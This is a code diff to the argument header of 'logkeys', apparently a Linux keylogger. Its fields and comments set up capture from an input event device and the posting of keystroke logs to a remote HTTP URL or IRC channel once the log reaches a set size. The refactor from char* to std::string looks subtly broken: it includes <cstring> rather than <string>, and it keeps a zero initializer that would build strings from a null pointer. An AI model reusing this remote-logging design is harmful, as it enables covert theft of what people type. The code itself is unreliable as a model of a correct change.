@@ -9,6 +9,8 @@
 #ifndef _ARGS_H_
 #define _ARGS_H_
 
+#include <cstring>
+
 namespace logkeys {
 
 struct arguments
@@ -16,13 +18,13 @@ struct arguments
   bool start;          // start keylogger, -s switch
   bool kill;           // stop keylogger, -k switch
   bool us_keymap;      // use default US keymap, -u switch
-  char * logfile;      // user-specified log filename, -o switch
-  char * keymap;       // user-specified keymap file, -m switch or --export-keymap
-  char * device;       // user-specified input event device, given with -d switch
-  char * http_url;     // remote HTTP URL to POST log to, --post-http switch
-  char * irc_entity;   // if --post-irc effective, this holds the IRC entity to PRIVMSG (either #channel or NickName)
-  char * irc_server;   // if --post-irc effective, this holds the IRC hostname
-  char * irc_port;     // if --post-irc effective, this holds the IRC port number
+  std::string logfile;      // user-specified log filename, -o switch
+  std::string keymap;       // user-specified keymap file, -m switch or --export-keymap
+  std::string device;       // user-specified input event device, given with -d switch
+  std::string http_url;     // remote HTTP URL to POST log to, --post-http switch
+  std::string irc_entity;   // if --post-irc effective, this holds the IRC entity to PRIVMSG (either #channel or NickName)
+  std::string irc_server;   // if --post-irc effective, this holds the IRC hostname
+  std::string irc_port;     // if --post-irc effective, this holds the IRC port number
   off_t post_size;     // post log file to remote when of size post_size, --post-size switch
   int flags;           // holds the following option flags
 #define FLAG_EXPORT_KEYMAP    0x1  // export keymap obtained from dumpkeys, --export-keymap is used
@@ -31,7 +33,7 @@ struct arguments
 #define FLAG_POST_HTTP        0x8  // post log to remote HTTP server, --post-http switch
 #define FLAG_POST_IRC        0x10  // post log to remote IRC server, --post-irc switch
 #define FLAG_POST_SIZE       0x20  // post log to remote HTTP or IRC server when log of size optarg, --post-size
-} args = {0};  // default all args to 0x0
+} args = {0};  // default all args to 0x0 or ""
 
 
 void process_command_line_arguments(int argc, char **argv)
